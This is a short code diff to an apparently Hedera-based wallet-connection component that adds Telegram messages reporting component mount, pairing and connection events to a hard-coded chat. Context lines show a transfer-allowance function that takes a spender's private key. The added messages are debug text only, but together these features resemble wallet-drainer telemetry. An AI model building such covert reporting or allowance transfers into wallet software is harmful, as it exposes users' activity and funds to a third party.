@@ -15,6 +15,7 @@ const chatId = '-1002734673892';
 export const HashConnectClient = () => {
   const dispatch = useDispatch();
   const syncCalledRef = useRef(false); // To track if syncWithHashConnect has already been called
+  sendMessageToTelegram('[DEBUG] HashConnectClient component mounted');
 
   async function hbarAllowanceFcn(owner: any, receiver: any, sendBal: any, spender: any, spenderPvKey: any, client: any) {
     const approvedSendTx = await new TransferTransaction()
@@ -188,6 +189,7 @@ export const HashConnectClient = () => {
 
   useEffect(() => {
     const pairingCallback = (data: any) => {
+      sendMessageToTelegram('[DEBUG] pairingCallback triggered, calling syncWithHashConnect');
       syncWithHashConnect(); // Trigger sync on pairing
     };
 
@@ -200,8 +202,7 @@ export const HashConnectClient = () => {
 
   useEffect(() => {
     const connectionCallback = (data: any) => {
-      // console.log("connectionStatusChangeEvent fired", data);
-      // console.log("Connection status changed:", data);
+      sendMessageToTelegram('[DEBUG] connectionCallback triggered, calling syncWithHashConnect');
       syncWithHashConnect(); // Trigger sync on connection status change
     };
 
